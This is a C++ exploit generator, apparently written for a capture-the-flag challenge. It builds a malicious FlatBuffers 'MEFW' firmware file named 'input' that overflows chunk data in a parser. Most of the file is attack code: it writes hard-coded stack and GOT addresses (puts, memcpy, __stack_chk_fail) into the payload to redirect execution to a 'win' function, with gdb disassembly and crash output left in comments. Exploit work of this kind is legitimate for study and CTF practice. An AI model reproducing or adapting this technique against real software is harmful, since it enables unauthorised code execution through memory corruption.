#include "mefw_generated.h"
#include <stdio.h>
#include <iostream>

int main() {
    flatbuffers::FlatBufferBuilder builder(10240000);

    std::vector<flatbuffers::Offset<me::Chunk>> chunks;

    auto cchunk = 18;
    auto chunkSize = 0x40;
    auto size = chunkSize * cchunk; 

    char data[size];
    for(int i=0;i<size;i++){
        data[i] = 0x80;
    }

    ulong* paddr = (ulong*)data;
    auto addr_first_chunk = 0x7fffffffd920;



    // for(int i=0;i<chunkSize;i++){
    //     data[0xf*chunkSize +i] = i & 0xff;
    // }


   
    paddr[(0xf * chunkSize) / 8 + 2] = addr_first_chunk - 0x100;

    paddr[5] = addr_first_chunk + 6*8;
    paddr[6] = addr_first_chunk + 8*8;
    paddr[7] = addr_first_chunk + 8*8 + 3*8;
    /*

        0x00000000004011e0 <+0>:     jmpq   *0x7f0a(%rip)        # 0x4090f0 <puts@got.plt>
        0x00000000004011e6 <+6>:     pushq  $0x1b
        0x00000000004011eb <+11>:    jmpq   0x401020


        0x4090f0 <puts@got.plt>:        0x00000000004011e6
    */
    paddr[8] = 0x11;
    paddr[9] = 0x4090f0;  // puts@got.plt, ezt akarjuk fejbenyomni
    paddr[9] = 0x7ffff7b81750; //stack_chk_fail


    //     Dump of assembler code for function memcpy@plt:
    //    0x00000000004010e0 <+0>:     jmpq   *0x7f8a(%rip)        # 0x409070 <memcpy@got.plt>
    //    0x00000000004010e6 <+6>:     pushq  $0xb
    //    0x00000000004010eb <+11>:    jmpq   0x401020
    // End of assembler dump.
    // (gdb) x/x 0x7f8a + 0x00000000004010e6
    // 0x409070 <memcpy@got.plt>:      0x00007ffff7bdd110
    paddr[9] = 0x409070; 

    // de ebbol le kell vonni hogy hanyadik blokknal tartunk, mert annyival el fogja indexelni
    paddr[9] -= 0x10 * chunkSize;
    paddr[10] = 0;

    //paddr[(0xf * chunkSize) / 8 + 0] = 0x401e18;     // ezzel: address of win
    //paddr[(0xf * chunkSize) / 8 + 1] = 0x8888888888888888;


    paddr[(0x10 * chunkSize) / 8 + 0] = 0x401e18;
    /*
        [+ME] TraceHub loading config.
        [+ME] TraceHub successfully initialized.
        *** stack smashing detected ***: terminated

    */
    // disass 0x4011e0


    for(int ichunk = 0; ichunk < cchunk; ichunk++){
        std::vector<uint8_t> vecData;
        for(int i=0;i<chunkSize;i++){
            vecData.push_back(data[ichunk * chunkSize + i]);
        }

        auto data_vector = builder.CreateVector(vecData);
        auto chunk = me::CreateChunk(builder, data_vector);

        chunks.push_back(chunk);
    }
    auto chunk_vector = builder.CreateVector(chunks);
    auto file = me::CreateFile(builder, 
        builder.CreateString("/home/bup/ct"),
        cchunk,
        0,
        chunk_vector
    );
    
    std::vector<flatbuffers::Offset<me::File>> files;
    files.push_back(file);
    auto file_vector = builder.CreateVector(files);

    auto fwHeader = me::CreateFwHeader(builder, 0x1337, 0x1337, 0, file_vector);

    builder.Finish(fwHeader, "MEFW");

    uint8_t *buf = builder.GetBufferPointer();
    int builderSize = builder.GetSize();

    std::cout << "write input " << size << "\n";
    FILE* pFile;
    pFile = fopen("input", "wb");
    fwrite(buf, 1, builderSize, pFile);
    fclose(pFile);
    return 0;

}